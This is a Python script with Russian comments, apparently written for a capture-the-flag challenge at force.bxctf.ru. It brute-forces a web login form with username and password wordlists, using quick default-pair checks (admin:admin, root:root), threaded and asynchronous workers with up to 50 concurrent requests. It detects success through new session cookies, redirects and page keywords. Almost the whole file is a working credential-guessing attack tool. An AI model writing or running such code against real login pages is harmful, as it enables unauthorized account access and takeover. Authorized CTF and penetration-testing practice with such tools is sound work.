import requests
import time
import re
import asyncio
import aiohttp
import concurrent.futures
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from threading import Lock
import queue

# ===================== ОБЩИЕ НАСТРОЙКИ =====================
BASE = "https://force.bxctf.ru"
LOGIN_PAGE = BASE + "/"
USERNAME_WORDLIST_PATH = "/src/main/python/force(NOT_DONE)/force1/UserPassJay.txt"
PASSWORD_WORDLIST_PATH = "/src/main/python/force(NOT_DONE)/force1/10k_most_common.txt"
MAX_ATTEMPTS = 50000
MAX_WORKERS = 50  # Количество потоков/корутин
REQUEST_DELAY = 0.01  # Задержка между запросами в одном потоке

# Глобальные переменные для синхронизации
found_credentials = []
found_lock = Lock()
attempt_counter = 0
counter_lock = Lock()


# ===================== АСИНХРОННАЯ ВЕРСИЯ (САМАЯ БЫСТРАЯ) =====================
async def method_async_cookies():
    """Асинхронный метод проверки cookies"""
    print("\n" + "=" * 60)
    print("АСИНХРОННЫЙ МЕТОД: Проверка cookies")
    print("=" * 60)

    WATCH_COOKIES = ["session", "jwt", "token", "auth", "PHPSESSID", "connect.sid"]

    async def check_credential(session, username, password):
        global attempt_counter, found_credentials

        try:
            # Создаем отдельную сессию для каждого запроса
            async with aiohttp.ClientSession() as req_session:
                # GET страницы
                async with req_session.get(LOGIN_PAGE) as resp_get:
                    cookies_before = dict(req_session.cookie_jar)

                # POST логина
                data = {"login": username, "password": password}
                async with req_session.post(LOGIN_PAGE, data=data, allow_redirects=True) as resp:
                    cookies_after = dict(req_session.cookie_jar)

                    # Проверка cookies
                    for cookie_name in WATCH_COOKIES:
                        if cookie_name in cookies_after and cookie_name not in cookies_before:
                            return True
                        if cookie_name in cookies_after and cookie_name in cookies_before:
                            if cookies_after[cookie_name] != cookies_before[cookie_name]:
                                return True

                await asyncio.sleep(REQUEST_DELAY)
                return False

        except Exception as e:
            return False

    async def process_credentials():
        global attempt_counter, found_credentials

        # Загрузка данных
        with open(USERNAME_WORDLIST_PATH, "r", encoding="utf-8", errors="ignore") as f:
            usernames = [line.strip() for line in f if line.strip()]

        with open(PASSWORD_WORDLIST_PATH, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]

        print(f"Загружено {len(usernames)} пользователей и {len(passwords)} паролей")
        print(f"Запуск {MAX_WORKERS} асинхронных workers...")

        # Создаем очередь задач
        tasks = []
        for username in usernames[:100]:  # Ограничим для теста
            for password in passwords[:100]:
                if len(tasks) >= MAX_ATTEMPTS:
                    break
                tasks.append((username, password))

        print(f"Создано {len(tasks)} задач")

        # Обработка задач батчами
        batch_size = MAX_WORKERS * 2
        results = []

        for i in range(0, len(tasks), batch_size):
            batch = tasks[i:i + batch_size]

            async with aiohttp.ClientSession() as session:
                batch_tasks = []
                for username, password in batch:
                    task = check_credential(session, username, password)
                    batch_tasks.append((username, password, task))

                # Ждем завершения батча
                for username, password, task in batch_tasks:
                    try:
                        success = await asyncio.wait_for(task, timeout=10.0)
                        if success:
                            with found_lock:
                                found_credentials.append(f"{username}:{password}")
                                print(f"🎯 УСПЕХ! {username}:{password}")
                    except asyncio.TimeoutError:
                        continue
                    except Exception as e:
                        continue

            print(f"Обработано {min(i + batch_size, len(tasks))}/{len(tasks)} задач")

            # Небольшая пауза между батчами
            await asyncio.sleep(0.1)

    await process_credentials()

    print(f"\nНайдено комбинаций: {len(found_credentials)}")
    for cred in found_credentials:
        print(f"✓ {cred}")


# ===================== МНОГОПОТОЧНАЯ ВЕРСИЯ =====================
def method_threaded_cookies():
    """Многопоточный метод проверки cookies"""
    print("\n" + "=" * 60)
    print("МНОГОПОТОЧНЫЙ МЕТОД: Проверка cookies")
    print("=" * 60)

    WATCH_COOKIES = ["session", "jwt", "token", "auth", "PHPSESSID", "connect.sid"]

    def check_auth_cookies(session, resp, cookies_before):
        cookies_after = session.cookies.get_dict()
        for cookie_name in WATCH_COOKIES:
            if cookie_name in cookies_after and cookie_name not in cookies_before:
                return True
            if cookie_name in cookies_after and cookie_name in cookies_before:
                if cookies_after[cookie_name] != cookies_before[cookie_name]:
                    return True
        return False

    def worker(cred_queue, results_queue):
        while True:
            try:
                username, password = cred_queue.get_nowait()
            except queue.Empty:
                break

            try:
                session = requests.Session()

                # GET страницы
                resp_get = session.get(LOGIN_PAGE, timeout=5)
                cookies_before = session.cookies.get_dict().copy()

                # POST логина
                resp = session.post(
                    LOGIN_PAGE,
                    data={"login": username, "password": password},
                    allow_redirects=True,
                    timeout=5
                )

                if check_auth_cookies(session, resp, cookies_before):
                    results_queue.put(f"{username}:{password}")

                time.sleep(REQUEST_DELAY)

            except Exception as e:
                continue
            finally:
                cred_queue.task_done()

    # Загрузка данных
    with open(USERNAME_WORDLIST_PATH, "r", encoding="utf-8", errors="ignore") as f:
        usernames = [line.strip() for line in f if line.strip()]

    with open(PASSWORD_WORDLIST_PATH, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"Загружено {len(usernames)} пользователей и {len(passwords)} паролей")

    # Создаем очередь задач
    cred_queue = queue.Queue()
    results_queue = queue.Queue()

    # Добавляем задачи в очередь (ограничим для теста)
    task_count = 0
    for username in usernames[:50]:  # Первые 50 пользователей
        for password in passwords[:100]:  # Первые 100 паролей
            if task_count >= MAX_ATTEMPTS:
                break
            cred_queue.put((username, password))
            task_count += 1

    print(f"Создано {task_count} задач")
    print(f"Запуск {MAX_WORKERS} потоков...")

    # Запускаем workers
    threads = []
    for _ in range(min(MAX_WORKERS, task_count)):
        thread = threading.Thread(target=worker, args=(cred_queue, results_queue))
        thread.daemon = True
        thread.start()
        threads.append(thread)

    # Ждем завершения
    cred_queue.join()

    # Собираем результаты
    found = []
    while not results_queue.empty():
        found.append(results_queue.get())

    print(f"\nНайдено комбинаций: {len(found)}")
    for cred in found:
        print(f"✓ {cred}")


# ===================== ОПТИМИЗИРОВАННЫЙ СЕКЦИОННЫЙ ПЕРЕБОР =====================
def method_section_optimized():
    """Оптимизированный метод с секционным перебором"""
    print("\n" + "=" * 60)
    print("ОПТИМИЗИРОВАННЫЙ МЕТОД: Секционный перебор")
    print("=" * 60)

    def check_combination(username, password):
        try:
            session = requests.Session()

            # GET страницы
            resp_get = session.get(LOGIN_PAGE, timeout=5)
            cookies_before = session.cookies.get_dict().copy()

            # POST логина
            resp = session.post(
                LOGIN_PAGE,
                data={"login": username, "password": password},
                allow_redirects=True,
                timeout=5
            )

            # Быстрая проверка по нескольким критериям
            cookies_after = session.cookies.get_dict()

            # 1. Проверка cookies
            for cookie_name in ['session', 'token', 'jwt', 'auth']:
                if cookie_name in cookies_after and cookie_name not in cookies_before:
                    return True
                if cookie_name in cookies_after and cookie_name in cookies_before:
                    if cookies_after[cookie_name] != cookies_before[cookie_name]:
                        return True

            # 2. Проверка редиректа
            if '/login' not in resp.url.lower() and resp.url.lower() != LOGIN_PAGE.lower():
                return True

            # 3. Быстрая проверка по тексту
            content_lower = resp.text.lower()
            if any(word in content_lower for word in ['logout', 'dashboard', 'welcome']):
                return True
            if any(word in content_lower for word in ['invalid', 'wrong', 'incorrect']):
                return False

            return False

        except Exception:
            return False

    # Загрузка данных
    with open(USERNAME_WORDLIST_PATH, "r", encoding="utf-8", errors="ignore") as f:
        usernames = [line.strip() for line in f if line.strip()]

    with open(PASSWORD_WORDLIST_PATH, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"Загружено {len(usernames)} пользователей и {len(passwords)} паролей")

    # Разбиваем на секции для параллельной обработки
    def process_section(username_section, password_section, section_id):
        found_section = []
        total = len(username_section) * len(password_section)
        processed = 0

        for username in username_section:
            for password in password_section:
                if check_combination(username, password):
                    found_section.append(f"{username}:{password}")
                    print(f"🎯 Секция {section_id}: {username}:{password}")

                processed += 1
                if processed % 100 == 0:
                    print(f"Секция {section_id}: {processed}/{total}")

        return found_section

    # Разбиваем данные на секции
    username_sections = [usernames[i:i + 10] for i in range(0, len(usernames), 10)]
    password_sections = [passwords[i:i + 100] for i in range(0, len(passwords), 100)]

    print(f"Создано {len(username_sections)} секций пользователей и {len(password_sections)} секций паролей")

    # Обрабатываем первую секцию для демонстрации
    if username_sections and password_sections:
        found = process_section(username_sections[0], password_sections[0], "1/1")
        print(f"\nНайдено комбинаций: {len(found)}")
        for cred in found:
            print(f"✓ {cred}")


# ===================== БЫСТРЫЙ МЕТОД С ПРЕДВАРИТЕЛЬНОЙ ФИЛЬТРАЦИЕЙ =====================
def method_quick_scan():
    """Быстрый метод с предварительной фильтрацией"""
    print("\n" + "=" * 60)
    print("БЫСТРЫЙ МЕТОД: Предварительная фильтрация")
    print("=" * 60)

    # Популярные комбинации для быстрой проверки
    common_combinations = [
        ("admin", "admin"),
        ("root", "root"),
        ("admin", "password"),
        ("admin", "123456"),
        ("root", "password"),
        ("test", "test"),
        ("guest", "guest"),
    ]

    def quick_check(username, password):
        try:
            session = requests.Session()
            resp_get = session.get(LOGIN_PAGE, timeout=3)
            cookies_before = session.cookies.get_dict().copy()

            resp = session.post(
                LOGIN_PAGE,
                data={"login": username, "password": password},
                allow_redirects=True,
                timeout=3
            )

            # Быстрая проверка
            cookies_after = session.cookies.get_dict()
            if any(cookie_name in cookies_after and
                   (cookie_name not in cookies_before or
                    cookies_after[cookie_name] != cookies_before.get(cookie_name))
                   for cookie_name in ['session', 'token', 'jwt']):
                return True

            if '/login' not in resp.url.lower():
                return True

            return False

        except Exception:
            return False

    print("Быстрая проверка популярных комбинаций...")
    found = []

    for username, password in common_combinations:
        if quick_check(username, password):
            found.append(f"{username}:{password}")
            print(f"🎯 Быстрая находка: {username}:{password}")

    if found:
        print(f"\nНайдено комбинаций: {len(found)}")
        for cred in found:
            print(f"✓ {cred}")
    else:
        print("Быстрая проверка не дала результатов, запускаем полный перебор...")
        method_section_optimized()


# ===================== ГЛАВНОЕ МЕНЮ =====================
def main():
    print("\n" + "=" * 70)
    print(" 🔐 УСКОРЕННЫЕ МЕТОДЫ ПРОВЕРКИ АВТОРИЗАЦИИ ".center(70))
    print("=" * 70)
    print("""
Выберите метод (рекомендуется по порядку):
1.  Быстрая проверка (популярные комбинации)
2.  Оптимизированный перебор (баланс скорости и надежности)
3.  Многопоточный метод (высокая производительность) 
4.  Асинхронный метод (МАКСИМАЛЬНАЯ СКОРОСТЬ - рекомендуется)
5.  Стандартный медленный метод (для тестирования)
0.  Выход
    """)

    choice = input("Ваш выбор: ").strip()

    methods = {
        '1': method_quick_scan,
        '2': method_section_optimized,
        '3': method_threaded_cookies,
        '4': lambda: asyncio.run(method_async_cookies()),
        '5': lambda: print("Используйте оригинальные методы для медленного перебора")
    }

    if choice in methods:
        start_time = time.time()
        methods[choice]()
        end_time = time.time()
        print(f"\nВремя выполнения: {end_time - start_time:.2f} секунд")
    elif choice == '0':
        print("Выход...")
    else:
        print("Неверный выбор!")


if __name__ == "__main__":
    # Добавляем поддержку потоков
    import threading

    main()
